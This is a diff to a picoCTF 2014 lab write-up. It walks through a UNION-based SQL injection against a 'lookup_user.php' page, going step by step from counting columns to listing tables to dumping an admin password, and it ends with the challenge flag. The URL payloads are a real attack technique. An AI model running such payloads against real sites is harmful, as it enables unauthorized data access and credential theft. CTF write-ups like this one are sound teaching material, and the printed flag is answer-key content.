@@ -1,23 +1,29 @@
 The evolution of the injection:
-1.
-http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+null+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+LIMIT+1&debug=1
 
-This first query gives us empty strings for username, display_name, location, and email
+1.
+http://web2014.picoctf.com/injection3/lookup_user.php?id=1+order+by+7&debug=1
+
+This first query utilizes the "order by" trick to find the number of columns in the table
 
 2.
-http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+null+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+LIMIT+40,+1&debug=1
+http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+null+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+LIMIT+1&debug=1
 
-This second query is the farthest offset that still gives us empty strings(valid query)
+This second query gives us empty strings for username, display_name, location, and email
 
 3.
-http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+table_name+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+WHERE+version+=+10+LIMIT+40,+1&debug=1
+http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+null+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+LIMIT+40,+1&debug=1
 
-This third query gives us the table name "super_secret_users" for username (I'm not sure why the previous query didn't work and display_name is where username should be) Also note that version isn't required here
+This third query is the farthest offset that still gives us empty strings(valid query)
 
 4.
+http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+table_name+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+WHERE+version+=+10+LIMIT+40,+1&debug=1
+
+This fourth query gives us the table name "super_secret_users" for username (I'm not sure why the previous query didn't work and display_name is where username should be) Also note that version isn't required here
+
+5.
 http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+password+AS+username,+password+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+super_secret_users+LIMIT+1&debug=1
 
-This fourth query gives us the password "not_the_flag_super_secret_admin_password"
+This fifth query gives us the password "not_the_flag_super_secret_admin_password"
 
 Logging in as admin,
 Your flag is: flag_2tc7ZPa5PEhcyZJXgH
